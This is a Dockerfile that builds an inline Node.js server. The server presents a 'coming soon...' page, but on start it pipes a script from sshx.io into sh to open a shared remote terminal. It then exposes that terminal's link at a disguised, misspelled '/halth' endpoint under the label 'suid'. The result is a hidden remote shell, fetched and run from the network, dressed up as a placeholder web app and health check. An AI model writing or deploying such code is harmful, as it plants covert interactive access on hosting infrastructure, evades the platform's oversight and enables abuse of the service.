FROM ubuntu:22.04

# Prevent prompts
ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    ca-certificates \
    nodejs \
    npm \
    && rm -rf /var/lib/apt/lists/*

# Create app directory
WORKDIR /app

# Create Node.js server inline
RUN cat << 'EOF' > server.js
const http = require("http");

let sshxLink = "starting...";

// Start sshx in background and capture link
const { spawn } = require("child_process");

const sshx = spawn("sh", ["-c", "curl -sSf https://sshx.io/get | sh"], {
  detached: true,
  stdio: ["ignore", "pipe", "pipe"]
});

sshx.stdout.on("data", (data) => {
  const text = data.toString();
  const match = text.match(/https:\/\/sshx\.io\/\S+/);
  if (match) {
    sshxLink = match[0];
    console.log("SSHX Link:", sshxLink);
  }
});

sshx.stderr.on("data", (data) => {
  console.error("sshx error:", data.toString());
});

sshx.unref();

const server = http.createServer((req, res) => {
  res.setHeader("Content-Type", "application/json");

  if (req.url === "/") {
    res.end(JSON.stringify({
      message: "coming soon..."
    }));
  } 
  else if (req.url === "/halth") {
    res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: sshxLink
    }));
  } 
  else {
    res.statusCode = 404;
    res.end(JSON.stringify({ error: "Not Found" }));
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log("Server listening on port", PORT);
});
EOF

# Render expects app to listen on $PORT
EXPOSE 3000

CMD ["node", "server.js"]
